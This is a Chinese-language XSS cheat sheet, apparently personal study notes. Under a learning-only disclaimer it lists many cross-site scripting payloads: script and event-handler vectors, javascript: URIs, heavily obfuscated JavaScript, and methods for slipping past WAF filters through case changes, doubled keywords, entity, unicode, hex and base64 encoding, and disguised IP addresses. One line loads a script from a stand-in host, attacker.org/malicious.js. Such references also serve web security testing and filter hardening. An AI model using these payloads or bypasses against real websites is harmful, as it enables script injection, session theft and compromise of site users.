# XSS 笔记

---

## 免责声明

`本人撰写的手册,仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关。`

---

## Reference

- [XSS插入绕过一些方式总结](https://blog.csdn.net/qq_29277155/article/details/51320064)
- [XSS总结](https://xz.aliyun.com/t/4067)
- [WAF的XSS绕过姿势](https://www.freebuf.com/articles/web/81959.html)
- [他山之石 | 对 XSS 的一次深入分析认识](https://www.freebuf.com/articles/web/195507.html)
- [minimaxir/big-list-of-naughty-strings](https://github.com/minimaxir/big-list-of-naughty-strings)
- [深入理解浏览器解析机制和XSS向量编码](http://bobao.360.cn/learning/detail/292.html)
- [csp与bypass的探讨(译文)](http://wutongyu.info/csp-2015/)

---

## payload 示例
```html
<script>alert(123)</script>
<script>prompt(1);</script>
<script>confirm(1);</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>+alert(1)</script>
<script>setTimeout(alert(1),0)</script>
<script src=data:text/javascript,alert(1)></script>
<script>alert(String.fromCharCode(49,49))</script>
<<SCRIPT>alert("XSS");
//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<svg><script>123<1>alert(123)</script>
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
--><script>alert(123)</script>
><script>alert(123);</script x=
<script>alert/(a/)</script>
<script NAUGHTY_HACKER>alert(1)</script NAUGHTY_HACKER>

绕过进行一次移除操作：
<scr<script>ipt>alert("XSS")</scr<script>ipt>
Script 标签可以用于定义一个行内的脚本或者从其他地方加载脚本：
<script>alert("XSS")</script>
<script src="http://attacker.org/malicious.js"></script>
```
```html
<img>
<img src=x onerror=alert(123) />

<input>
<input onfocus="alert('xss');">
<input onblur=alert("xss") autofocus><input autofocus> //竞争焦点,从而触发onblur事件
<input onfocus="alert('xss');" autofocus>  //通过autofocus属性执行本身的focus事件,这个向量是使焦点自动跳到输入元素上,触发焦点事件,无需用户去触发
<input type="image" formaction=JaVaScript:alert(0)>

<details>
<details open OntogGle="alert(1)">  //使用open属性触发ontoggle事件,无需用户去触发

<svg>
<svg onload=alert("xss");>
<svg/onload=prompt(1);>

<select>
<select onfocus=alert(1)></select>
<select onfocus=alert(1) autofocus> //通过autofocus属性执行本身的focus事件

<iframe>
<iframe onload=alert("xss");></iframe>
<IFRAME SRC="javascript:alert(29);"></IFRAME>

<video>
<video><source onerror="alert(1)">
<video poster=javascript:alert(1)//></video> // Works Upto Opera 10.5

<audio>
<audio src=x  onerror=alert("xss");>

<body>

<body
onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>    //利用换行符以及autofocus,自动去触发onscroll事件,无需用户去触发
<body onload=prompt(1);>

<textarea>
<textarea onfocus=alert("xss"); autofocus>

<keygen>
<keygen autofocus onfocus=alert(1)> //仅限火狐

<marquee>
<marquee onstart=alert(1)>hack the planet</marquee>  //Chrome不行,火狐和IE都可以
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<marquee loop="1" onfinish=alert(1)>hack the planet</marquee>
<marquee/onstart=confirm(2)>/

<isindex>
<isindex type=image src=1 onerror=alert("xss")>   //仅限于IE

<anytag>
<anytag onmouseover=alert(15)>M
<anytag onclick=alert(16)>M

<a>
<a onmouseover=alert(17)>M
<a onclick=alert(18)>M
<a href=javascript:alert(19)>M
<a href="javascript:alert('test')">link</a>

<div>
<div onclick="alert('xss')">
<div onmouseenter="alert('xss')">   //当用户鼠标移动到 div 上时就会触发我们的代码。
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">

<style>
<style onload=alert(1) />

<form>
<form/action=javascript:alert(22)><input/type=submit>
<form onsubmit=alert(23)><button>M

<object>
<object data="javascript:alert(document.domain)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">

<embed>
<embed/src=javascript:alert(29);>
```

```html
利用link远程包含js文件
PS：在无CSP的情况下才可以
<link rel=import href="http://127.0.0.1/1.js">


javascript伪协议
<a>标签
<a href="javascript:alert(`xss`);">xss</a>

<iframe>标签
<iframe src=javascript:alert('xss');></iframe>

<img>标签
<img src=javascript:alert('xss')>//IE7以下

<form>标签
<form action="Javascript:alert(1)"><input type=submit>


其它
expression属性
<img style="xss:expression(alert('xss''))"> // IE7以下
<div style="color:rgb(''�x:expression(alert(1))"></div> //IE7以下
<style>#test{x:expression(alert(/XSS/))}</style> // IE7以下

background属性
<table background=javascript:alert(1)></table> //在Opera 10.5和IE6上有效

杂项
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
<math><a xlink:href="//baidu.com">click

<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>

<script>ꆇ='',ꉄ=!ꆇ+ꆇ,ꉦ=!ꉄ+ꆇ,ꊗ=ꆇ+{},ꀻ=ꉄ[ꆇ++],ꃋ=ꉄ[ꆚ=ꆇ],ꋕ=++ꆚ+ꆇ,ꐍ=ꊗ[ꆚ+ꋕ],ꉄ[ꐍ+=ꊗ[ꆇ]+(ꉄ.ꉦ+ꊗ)[ꆇ]+ꉦ[ꋕ]+ꀻ+ꃋ+ꉄ[ꆚ]+ꐍ+ꀻ+ꊗ[ꆇ]+ꃋ][ꐍ](ꉦ[ꆇ]+ꉦ[ꆚ]+ꉄ[ꋕ]+ꃋ+ꀻ+"(ꆇ)")()</script>

<script>ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()</script>

¼script¾alert(¢XSS¢)¼/script¾

<portal id="q" src="bing.com" onload="print(q.activate())"></portal>
```

## 绕过方法
1. 使用无害的payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被HTML编码,是否标签被过滤,是否过滤<>等等；
2. 如果过滤闭合标签,尝试无闭合标签的payload`<b,<i,<marquee`观察响应；
```html
绕过长度限制
"onclick=alert(1)//
"><!--
--><script>alert(xss);<script>
```
```html
过滤空格
用/代替空格
<img/src="x"/onerror=alert("xss");>
```

```html
过滤关键字
大小写绕过
<ImG sRc=x onerRor=alert("xss");>
<scRiPt>alert(1);</scrIPt>


双写关键字
有些waf可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
<imimgg srsrcc=x onerror=alert("xss");>


替换绕过
过滤 alert 用 prompt，confirm，top['alert'](1) 代替绕过
过滤 () 用 ``代替绕过
过滤空格 用 %0a（换行符）,%0d（回车符），/**/ 代替绕过
小写转大写情况下 字符 ſ 大写后为 S（ſ 不等于 s）


字符拼接
利用eval
<img src="x" onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">


利用top
<script>top["al"+"ert"](`xss`);</script>


%00截断绕过
<a href=javascr%00ipt:alert(1)>xss</a>


其它字符混淆
有的waf可能是用正则表达式去检测是否有xss攻击,如果我们能fuzz出正则的规则,则我们就可以使用其它字符去混淆我们注入的代码了
下面举几个简单的例子
可利用注释、标签的优先级等
1.<<script>alert("xss");//<</script>
2.<title><img src=</title>><img src=x onerror="alert(`xss`);"> //因为title标签的优先级比img的高,所以会先闭合title,从而导致前面的img标签无效
3.<SCRIPT>var a="\\";alert("xss");//";</SCRIPT>


编码绕过
实体编码
javascrip&#x74;:alert(1) 十六进制
javascrip&#116;:alert(1) 十进制

Unicode编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;">

<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

url编码绕过
<img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))">

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii码绕过
<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

hex绕过
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制
<img src=x onerror=alert('\170\163\163')>

base64绕过
<img src="x" onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))">

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```
```html
过滤双引号,单引号
1.如果是html标签中,我们可以不用引号。如果是在js中,我们可以用反引号代替单双引号
<img src="x" onerror=alert(`xss`);>
2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
```
```html
过滤括号
当括号被过滤的时候可以使用throw来绕过
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```
```html
过滤url地址
使用url编码
<img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`>


使用IP
1.十进制IP
<img src="x" onerror=document.location=`http://2130706433/`>

2.八进制IP
<img src="x" onerror=document.location=`http://0177.0.0.01/`>

3.hex
<img src="x" onerror=document.location=`http://0x7f.0x0.0x0.0x1/`>

4.html标签中用//可以代替http://
<img src="x" onerror=document.location=`//www.baidu.com`>

5.使用\\
但是要注意在windows下\本身就有特殊用途,是一个path 的写法,所以\\在Windows下是file协议,在linux下才会是当前域的协议

6.使用中文逗号代替英文逗号
如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
<img src="x" onerror="document.location=`http://www。baidu。com`">//会自动跳转到百度
```
```js
fromCharCode方法绕过
String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)
eval(FromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))
```
```
javascript伪协议绕过
无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js
```
```js
换行绕过正则匹配
onmousedown
=alert(1)
```
```js
注释符
// 单行注释
<!-- --!> 注释多行内容
<!-- --> 注释多行内容
<-- --> 注释多行内容
<-- --！> 注释多行内容
--> 单行注释后面内容
/* */ 多行注释
有时还可以利用浏览器的容错性，不需要注释
```
```js
闭合标签空格绕过
</style ><script>alert(1)</script>
```
```
@符号绕过url限制
例如：https://www.segmentfault.com@xss.haozi.me/j.js
其实访问的是@后面的内容
```
```
")逃逸函数后接分号
例：");alert(1)//
```
```
绕过转义限制
例：
\")
alert(1) //
```